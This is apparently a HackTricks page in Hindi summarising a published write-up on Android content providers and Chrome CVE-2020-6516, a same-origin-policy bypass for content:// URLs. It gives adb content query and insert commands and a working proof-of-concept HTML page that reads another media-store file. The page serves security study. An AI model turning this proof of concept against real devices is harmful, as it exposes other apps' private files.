{{#include ../../banners/hacktricks-training.md}}

<figure><img src="https://pentest.eu/RENDER_WebSec_10fps_21sec_9MB_29042024.gif" alt=""><figcaption></figcaption></figure>

{% embed url="https://websec.nl/" %}

**यह पोस्ट का सारांश है [https://census-labs.com/news/2021/04/14/whatsapp-mitd-remote-exploitation-CVE-2021-24027/](https://census-labs.com/news/2021/04/14/whatsapp-mitd-remote-exploitation-CVE-2021-24027/)**

### मीडिया स्टोर में फ़ाइलें सूचीबद्ध करना

मीडिया स्टोर द्वारा प्रबंधित फ़ाइलों को सूचीबद्ध करने के लिए, नीचे दिए गए कमांड का उपयोग किया जा सकता है:
```bash
$ content query --uri content://media/external/file
```
एक अधिक मानव-अनुकूल आउटपुट के लिए, प्रत्येक अनुक्रमित फ़ाइल की केवल पहचानकर्ता और पथ प्रदर्शित करें:
```bash
$ content query --uri content://media/external/file --projection _id,_data
```
सामग्री प्रदाता अपने निजी नामस्थान में अलग-थलग होते हैं। किसी प्रदाता तक पहुँचने के लिए विशिष्ट `content://` URI की आवश्यकता होती है। किसी प्रदाता तक पहुँचने के लिए पथों की जानकारी एप्लिकेशन मैनिफेस्ट या Android ढांचे के स्रोत कोड से प्राप्त की जा सकती है।

### Chrome का सामग्री प्रदाताओं तक पहुँच

Android पर Chrome `content://` योजना के माध्यम से सामग्री प्रदाताओं तक पहुँच सकता है, जिससे यह तीसरे पक्ष के अनुप्रयोगों द्वारा निर्यात की गई फ़ोटो या दस्तावेज़ जैसी संसाधनों तक पहुँच प्राप्त कर सकता है। इसे स्पष्ट करने के लिए, एक फ़ाइल को मीडिया स्टोर में डाला जा सकता है और फिर Chrome के माध्यम से पहुँचा जा सकता है:

मीडिया स्टोर में एक कस्टम प्रविष्टि डालें:
```bash
cd /sdcard
echo "Hello, world!" > test.txt
content insert --uri content://media/external/file \
--bind _data:s:/storage/emulated/0/test.txt \
--bind mime_type:s:text/plain
```
नए डाले गए फ़ाइल की पहचानकर्ता खोजें:
```bash
content query --uri content://media/external/file \
--projection _id,_data | grep test.txt
# Output: Row: 283 _id=747, _data=/storage/emulated/0/test.txt
```
फाइल को फिर Chrome में फाइल के पहचानकर्ता के साथ बनाए गए URL का उपयोग करके देखा जा सकता है।

उदाहरण के लिए, किसी विशेष एप्लिकेशन से संबंधित फाइलों की सूची बनाने के लिए:
```bash
content query --uri content://media/external/file --projection _id,_data | grep -i <app_name>
```
### Chrome CVE-2020-6516: Same-Origin-Policy Bypass

_समान मूल नीति_ (SOP) एक सुरक्षा प्रोटोकॉल है जो ब्राउज़रों में वेब पृष्ठों को विभिन्न मूलों से संसाधनों के साथ बातचीत करने से रोकता है जब तक कि इसे क्रॉस-ओरिजिन-रिसोर्स-शेयरिंग (CORS) नीति द्वारा स्पष्ट रूप से अनुमति नहीं दी जाती। इस नीति का उद्देश्य जानकारी के लीक और क्रॉस-साइट अनुरोध धोखाधड़ी को रोकना है। Chrome `content://` को एक स्थानीय योजना के रूप में मानता है, जिसका अर्थ है कि SOP नियम अधिक सख्त हैं, जहां प्रत्येक स्थानीय योजना URL को एक अलग मूल के रूप में माना जाता है।

हालांकि, CVE-2020-6516 एक कमजोर बिंदु था जो Chrome में `content://` URL के माध्यम से लोड किए गए संसाधनों के लिए SOP नियमों को बायपास करने की अनुमति देता था। प्रभावी रूप से, `content://` URL से JavaScript कोड अन्य संसाधनों तक पहुँच सकता था जो `content://` URLs के माध्यम से लोड किए गए थे, जो एक महत्वपूर्ण सुरक्षा चिंता थी, विशेष रूप से Android उपकरणों पर जो Android 10 से पहले के संस्करण चला रहे थे, जहां स्कोप्ड स्टोरेज लागू नहीं किया गया था।

नीचे दिए गए प्रमाण-का-धारणा इस कमजोर बिंदु को प्रदर्शित करता है, जहां एक HTML दस्तावेज़, जिसे **/sdcard** के तहत अपलोड किया गया है और मीडिया स्टोर में जोड़ा गया है, अपने JavaScript में `XMLHttpRequest` का उपयोग करके मीडिया स्टोर में एक अन्य फ़ाइल की सामग्री को एक्सेस और प्रदर्शित करता है, SOP नियमों को बायपास करता है।

Proof-of-Concept HTML:
```xml
<html>
<head>
<title>PoC</title>
<script type="text/javascript">
function poc()
{
var xhr = new XMLHttpRequest();

xhr.onreadystatechange = function()
{
if(this.readyState == 4)
{
if(this.status == 200 || this.status == 0)
{
alert(xhr.response);
}
}
}

xhr.open("GET", "content://media/external/file/747");
xhr.send();
}
</script>
</head>
<body onload="poc()"></body>
</html>
```
<figure><img src="https://pentest.eu/RENDER_WebSec_10fps_21sec_9MB_29042024.gif" alt=""><figcaption></figcaption></figure>

{% embed url="https://websec.nl/" %}

{{#include ../../banners/hacktricks-training.md}}
